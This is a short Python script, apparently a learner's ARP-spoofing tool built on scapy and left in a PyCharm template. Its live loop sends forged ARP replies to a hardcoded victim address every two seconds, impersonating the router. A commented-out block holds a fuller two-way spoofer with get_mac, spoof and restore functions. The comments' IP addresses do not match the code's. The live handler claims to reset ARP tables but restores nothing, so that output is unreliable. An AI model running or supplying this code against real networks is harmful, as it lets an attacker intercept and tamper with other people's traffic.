# This is a sample Python script.

# Press Shift+F10 to execute it or replace it with your code.
# Press Double Shift to search everywhere for classes, files, tool windows, actions, and settings.
import scapy.all as scap
import sys
import time

send_packets_count = 0
target_ip = "192.168.0.105"
target_mac = "04:d9:f5:0c:b8:a7"

try:
    while True:

        packet = scap.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc="192.168.0.1")
        scap.send(packet, verbose=False) #Packet telling the Victim (with ip address 192.168.111.157) that the hacker is the Router.

        #packet = scap.ARP(op=2, pdst="192.168.0.1", hwdst="e8-48-b8-1e-6d-a1", psrc=target_ip)
        #scap.send(packet, verbose=False) #Packet telling the Router (with ip address 192.168.111.2) that the hacker is the Victim.

        send_packets_count += 1
        print("[+] Packets sent: " + str(send_packets_count))
        time.sleep(2)

except KeyboardInterrupt:
    print("\n[-] Detected CTRL + C ...."
          "Resetting ARP tables....Please wait.\n")

'''
def get_mac(ip):
    arp_request = scap.ARP(pdst=ip)
    broadcast = scap.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = scap.srp(arp_request_broadcast,
                              timeout=2, verbose=False)[0]

    return (answered_list)


def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scap.ARP(op=2, pdst=target_ip,
                       hwdst=target_mac,
                       psrc=spoof_ip)
    scap.send(packet, verbose=False)

def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scap.ARP(op=2, pdst=destination_ip,
                       hwdst=destination_mac,
                       psrc=source_ip, hwsrc=source_mac)
    scap.send(packet, count=4, verbose=False)


target_ip = "192.168.0.102"
gateway_ip = "192.168.0.1"

try:
    send_packets_count = 0
    while True:
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)
        send_packets_count += 2
        print(" \r[+] Packets sent: " + str(send_packets_count)),
        sys.stdout.flush()
        time.sleep(2)

except KeyboardInterrupt:
    print("\n[-] Detected CTRL + C ...."
          "Resetting ARP tables....Please wait.\n")
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)
'''